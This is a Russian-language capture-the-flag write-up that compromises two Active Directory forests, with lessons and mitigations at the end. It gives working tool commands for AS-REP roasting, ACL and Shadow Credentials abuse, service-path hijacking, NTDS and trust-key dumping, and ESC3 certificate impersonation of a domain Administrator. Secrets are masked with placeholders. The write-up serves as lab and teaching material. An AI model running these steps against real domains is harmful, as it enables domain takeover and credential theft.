# Old Trusty: полный путь через два домена AD и AD CS

[English](solve.md)

## 0. Задача и план

В задаче были два контроллера домена, принадлежащих разным лесам Active Directory:

- LEGACY: `dc01.legacy.corp`, домен `legacy.corp`;
- CORE: `dc02.core.corp`, домен `core.corp`;
- между лесами настроено доверие, связывающее LEGACY и CORE.

Нужно было получить два отдельных флага из рабочего стола `Administrator` на каждом контроллере. Оба флага получены. Это не два варианта одного и того же трюка: на первом контроллере сработала цепочка ACL, Shadow Credentials и управления службой, на втором — межлесный trust, доступ к конфигу PKI и выдача сертификата от имени администратора (ESC3).

Краткая карта решения:

1. На LEGACY найти доменного пользователя без Kerberos preauthentication и восстановить его пароль по AS-REP.
2. Через BloodHound проследить права `WriteDacl`, `AddMember` и `AddKeyCredentialLink` до сервисного пользователя `svc_ops`.
3. Через Shadow Credentials получить его NT-хэш, воспользоваться членством в `Server Operators` для управления службой и получить локального администратора на DC01.
4. Прочитать NTDS и первый флаг.
5. Извлечь секрет межлесного доверия, зайти в CORE через доверенную учётную запись `LEGACY$`.
6. Найти конфиг развертывания PKI на общей шаре, получить учётку `svc_enrollment`.
7. Выпустить сертификат Enrollment Agent, а затем сертификат Administrator по шаблону `User`, пригодный для PKINIT.
8. Получить NT-хэш Administrator второго леса и забрать второй флаг.

Исходный подробный журнал был в переданном архиве `writeups/OldTrusty/README.md`; там же имеются `FLAG1.txt` и `FLAG2.txt`, выводы Certipy, XML-конфиг и вспомогательные Python-скрипты. Ниже сохранены команды и причины выбора каждого шага. Конкретные IP, рабочие пароли, NT-хэши и полные значения флагов в публичном репозитории скрыты. За время конкурса инстанс неоднократно пересоздавался, поэтому точные адреса из разных логов не следует смешивать.

## 1. Разведка LEGACY: почему именно AS-REP

Сначала проверили службы DC01: Kerberos 88, LDAP 389/636, SMB 445 и DNS 53. Анонимные SMB/null-сессии не дали доступа к данным, LDAP потребовал bind. Нужна была доменная учётная запись.

Вместо перебора паролей на онлайн-службах проверили пользователей с отключённой предварительной аутентификацией Kerberos:

```bash
GetNPUsers.py legacy.corp/ -usersfile users.txt -no-pass -dc-ip <dc01> -format john
john hash.txt --format=krb5asrep
```

Из AS-REP восстановили пароль пользователя `jdoe`. Важное различие: это офлайн-проверка полученного AS-REP, а не поток логинов к контроллеру. Успешный пароль затем позволил аутентифицироваться в LDAP/SMB и собрать граф прав.

## 2. Цепочка ACL в BloodHound

Собрали сведения об объектах и правах, загрузили в BloodHound и искали путь от `jdoe` до пользователя или группы с привилегиями на DC01. Нашлась цепочка:

```text
jdoe --WriteDacl--> Legacy App Maintainers
     --AddMember--> Infrastructure Support
     --AddKeyCredentialLink--> svc_ops
svc_ops: member of Server Operators
```

`WriteDacl` позволяет изменить ACL группы, а `AddMember` — изменить её состав. Конечное `AddKeyCredentialLink` относится уже к `msDS-KeyCredentialLink` целевого пользователя: это место для Shadow Credentials.

В отчёте сохранились типовые команды `bloodyAD`. DN должны соответствовать найденным доменным объектам; они намеренно показаны как переменные, а не несуществующие точные значения.

```bash
bloodyAD -d legacy.corp -u jdoe -p '<jdoe-password>' -H <dc01> \
  add genericAll '<Legacy App Maintainers DN>' '<jdoe DN>'

bloodyAD -d legacy.corp -u jdoe -p '<jdoe-password>' -H <dc01> \
  add groupMember '<Legacy App Maintainers DN>' '<jdoe DN>'

bloodyAD -d legacy.corp -u jdoe -p '<jdoe-password>' -H <dc01> \
  add groupMember '<Infrastructure Support DN>' '<jdoe DN>'

bloodyAD -d legacy.corp -u jdoe -p '<jdoe-password>' -H <dc01> \
  add shadowCredentials '<svc_ops DN>' --path svc2
```

Критично понимать зависимость: переход к `svc_ops` появился благодаря графу делегированных прав, а не потому, что у `jdoe` изначально были права администратора домена.

## 3. Shadow Credentials и нюанс с PFX

После изменения `msDS-KeyCredentialLink` появляется возможность использовать связанную пару ключей для аутентификации `svc_ops` через сертификат. `bloodyAD` пытался сразу выполнить PKINIT, но получал `KDC_ERR_ETYPE_NOTSUPP`.

Здесь было легко ошибочно решить, что вся операция не состоялась. В исходном журнале зафиксировано другое: **PFX-файл был сохранён несмотря на ошибку встроенного PKINIT**. Поэтому дальнейшую аутентификацию выполнили отдельно:

```bash
certipy-ad auth -pfx svc2.pfx \
  -username svc_ops -domain legacy.corp -dc-ip <dc01>
```

Certipy получил NT-хэш `svc_ops`. В архиве он указан полностью; здесь вместо него используется `<svc_ops-NT>`.

Зачем это нужно: пароль сервисной учётки необязателен, если есть пригодный NT-хэш для поддерживаемого метода аутентификации.

## 4. Server Operators: почему не сработал psexec

`svc_ops` состоял в `Server Operators`. Эта группа может управлять некоторыми службами контроллера, однако это не равно полной доступности административной SMB-шары. В попытках через `psexec` и `atexec` возникали ошибки вроде `share not writable` и `rpc_s_access_denied`.

Правильным направлением стало **Service Control Manager (SCM)**, а не запись исполняемого файла на `ADMIN$`:

```bash
python3 services.py 'legacy/svc_ops@<dc01>' \
  -hashes :<svc_ops-NT> -no-pass list

python3 services.py 'legacy/svc_ops@<dc01>' \
  -hashes :<svc_ops-NT> -no-pass change \
  -name ReportSync \
  -path '<one-shot service command>'

python3 services.py 'legacy/svc_ops@<dc01>' \
  -hashes :<svc_ops-NT> -no-pass start -name ReportSync
```

В сохранённом оригинале one-shot команда создавала локальную административную учётную запись и добавляла её в группу Administrators. После запуска сервиса доступ этой учётки был проверен и подтверждён. Само имя/пароль созданной учётки не публикуем.

Это важный переход: членство в `Server Operators` было использовано для конфигурации запуска службы, а не для прямой записи в админскую шару.

## 5. LEGACY: NTDS и первый флаг

Имея локального администратора на DC01, получили доменные хэши через механизм репликации NTDS:

```bash
secretsdump.py 'legacy.corp/<local-admin>:<password>@<dc01>' -just-dc
```

Затем использовали хэш доменного Administrator для доступа к `C$` и чтения `Users\Administrator\Desktop\flag.txt`. Платформа приняла первый флаг `PP{...}`.

## 6. CORE: почему права из LEGACY не переносились напрямую

После первого флага возник отдельный вопрос: как попасть в `core.corp`. В CORE почти не было пользователей и не нашлось прямых ACL-путей от найденных учёток к `Administrator`. Межлесное доверие не делает пользователя LEGACY автоматически администратором CORE. В том числе мешает SID-фильтрация.

Первая задача — извлечь материал доверия из LEGACY. Обычный `secretsdump -just-dc` не дал нужный TDO-секрет. Сработал DRSR-инструмент `tdo_dump.py` с RPC endpoint `ncacn_ip_tcp`, тогда как вариант по named pipe прежде возвращал `access_denied`.

```bash
python3 tdo_dump.py -u Administrator -d legacy.corp -t <dc01> \
  --hashes <LEGACY-ADMIN-NT> \
  --tdo-guid <TDO-GUID> --dsa-guid <DSA-GUID> --debug
```

В результате получены ключи доверительной учётной записи и inter-realm AES-ключи. Они не эквивалентны `krbtgt` CORE и сами по себе не создают билета администратора CORE.

## 7. CORE: вход через учётную запись доверия

Доверительный аккаунт `LEGACY$` существует в `core.corp` и имеет обычный доменный уровень доступа. Полученный AES-ключ был использован для запроса TGT:

```bash
getTGT.py 'core.corp/LEGACY$' \
  -aesKey <trust-account-aes256> -dc-ip <dc02>
```

TGT выдан, но `C$` по-прежнему недоступен. Это соответствует ожиданию: мы аутентифицированы, но пока не привилегированы.

Зачем это всё было: доступ уровня Domain Users позволил просматривать разрешённые сетевые шары CORE, где и нашлась следующая зацепка.

## 8. Software$ и конфигурация PKI

В шаре `Software$` обнаружился конфиг:

```text
Software$\PKI\LegacyClient\enrollment-agent.xml

<Domain>CORE</Domain>
<Username>svc_enrollment</Username>
<Password><masked></Password>
<Authority>CORE-CA</Authority>
<Template>EnrollmentAgent</Template>
```

Пароль был записан **открытым текстом**. Пользователь `svc_enrollment` обладал возможностью оформления сертификатов как Enrollment Agent. Цепочка доверия привела к доступному конфигурационному файлу, который дал отдельный вход в механизм AD CS.

## 9. ESC3: два сертификата, а не один

По исходному отчёту, CA `CORE-CA` действительно публиковал, среди прочего, шаблоны `EnrollmentAgent` и `User`. Это подтверждали по атрибуту `certificateTemplates` объекта `EnrollmentService`, а не по всем объектам из контейнера Certificate Templates: наличие объекта шаблона в каталоге ещё не значит, что его выдаёт конкретный CA.

Первым шагом `svc_enrollment` оформил **свой** сертификат Enrollment Agent:

```bash
certipy-ad req -u svc_enrollment@core.corp -p '<svc-password>' \
  -ca CORE-CA -template EnrollmentAgent \
  -upn svc_enrollment@core.corp -pfx svc_enrollment.pfx \
  -dc-ip <dc02> -ns <dc02>
```

Затем с помощью сертификата агента запросили сертификат от имени Administrator. Ключевой параметр — `-on-behalf-of` и именно **шаблон User** для выдаваемого административного сертификата:

```bash
certipy-ad req -u svc_enrollment@core.corp -p '<svc-password>' \
  -pfx svc_enrollment.pfx \
  -ca CORE-CA -template User \
  -on-behalf-of 'CORE\Administrator' \
  -upn administrator@core.corp \
  -dc-ip <dc02> -ns <dc02> -target dc02.core.corp
```

Этот шаг подтверждён журналом решения и Certipy evidence в архиве.

## 10. Долгий тупик: KDC_ERR_PADATA_TYPE_NOSUPP

Поначалу сертификат от имени Administrator выпускали не по тому шаблону. KDC возвращал `KDC_ERR_PADATA_TYPE_NOSUPP`. Несколько гипотез оказались неверными:

- Некорректное SID-расширение: данные SID в сертификате on-behalf-of были штатными, не причиной отказа.
- «Сломанный AD CS/KDC»: наличие соответствующего сертификата у DC нельзя выводить только из пустого `userCertificate` объекта машины.
- Клиентская проблема с TLS/Schannel: LDAP StartTLS и LDAPS действительно не работали на части портов, но PKINIT не требует работоспособного LDAP over TLS.

Причина нашлась в EKU. Сертификат Enrollment Agent сам по себе предназначен для подписи запросов на выдачу, но его выпуск в этой конфигурации не содержал подходящего `Extended Key Usage` для Kerberos PKINIT. Проверяли так:

```bash
openssl pkcs12 -in administrator.pfx -clcerts -nokeys \
  -passin pass: | openssl x509 -noout -text
```

Нужно было проверить `X509v3 Extended Key Usage` и SAN/UPN. Переоформленный сертификат по шаблону `User` имел пригодные EKU и UPN в SAN. С ним аутентификация прошла. Это было **практически решающим исправлением** после длительной отладки.

## 11. CORE: PKINIT, NT-хэш, второй флаг

После успешной выдачи сертификата:

```bash
certipy-ad auth -pfx administrator.pfx \
  -username Administrator -domain core.corp -dc-ip <dc02>
```

Certipy сообщил получение TGT и NT-хэша Administrator. Затем проверили SMB-доступ и прочитали файл на DC02:

```bash
nxc smb <dc02> -u Administrator -H <CORE-ADMIN-NT> -d core.corp

impacket-smbclient.py 'core.corp/Administrator@<dc02>' \
  -hashes :<CORE-ADMIN-NT> -no-pass
# inside SMB client:
use C$
get Users\Administrator\Desktop\flag.txt
```

**Второй флаг тоже принят платформой.** В исходном архиве он присутствует в `evidence/FLAG2.txt`, здесь маска `PP{...}`.

## 12. Что ещё проверяли и почему отбросили

- **Прямые ACL в CORE:** `svc_enrollment` и `LEGACY$` не имели прав переписать Administrator; LDAP SDFlags не дал прямой эскалации.
- **Golden Ticket с inter-realm ключом:** получали `KRB_AP_ERR_BAD_INTEGRITY`, потому что подставленный ключ не является `krbtgt` CORE. Cross-realm referral с чужими SID не дал административных прав из-за SID-фильтрации.
- **LDAP StartTLS/LDAPS:** порты 389 и 3268 возвращали `LDAP 52 unavailableCriticalExtension`, TLS на 636/3269 обрывался. Это ограничило Schannel-ветку, но не PKINIT.
- **Смена пароля Administrator через LDAP:** `ldap 50 insufficientAccessRights`.
- **Другие шаблоны:** `UserSignature`/`ClientAuth` не выдавались этим CA, сервер отвечал `CERTSRV_E_UNSUPPORTED_CERT_TYPE`.
- **Первый сертификат без клиентского EKU:** выдача сертификата была успешной, но Kerberos не принимал его. Именно переход к `User` исправил ситуацию.

## 13. Выводы

1. Цепочки ACL — последовательность **разных** полномочий; сама по себе учётка `jdoe` не была привилегированной.
2. Ошибка PKINIT внутри `bloodyAD` не означала потерю созданного PFX.
3. `Server Operators` позволил изменить запуск службы, хотя `psexec`/`atexec` не работали.
4. После компрометации LEGACY нельзя просто подменить CORE krbtgt межлесным ключом.
5. Конфигурационные файлы PKI на доступных шарах могут дать недостающую учётную запись.
6. `Enrollment Agent` и `User` решают две разные задачи. Для входа Kerberos пригодность EKU у **конечного** сертификата критична.

## 14. Меры защиты

- Включить Kerberos preauthentication у всех пользователей; использовать стойкие пароли и мониторить AS-REP roast.
- Аудировать граф ACL и `msDS-KeyCredentialLink`, контролировать изменение членства групп и Shadow Credentials.
- Ограничить `Server Operators` и права управления службами, особенно на контроллерах.
- Защитить доступ к TDO/ключам доверия и применять SID filtering.
- Не хранить пароли сервисных учёток в XML на общедоступных шарах.
- Ограничить шаблоны Enrollment Agent, выдачу от имени другого пользователя и права `svc_enrollment`.

## 15. Артефакты

В переданном архиве сохранены оригинальные материалы: `OldTrusty/README.md`, `OldTrusty/scripts/`, `OldTrusty/evidence/20261114032846_Certipy.txt`, `enrollment-agent.xml` и оба файла подтверждения флагов. Публичный текст исключает живые пароли и полные хэши; для воспроизведения используются собственные авторизованные доменные стенды.
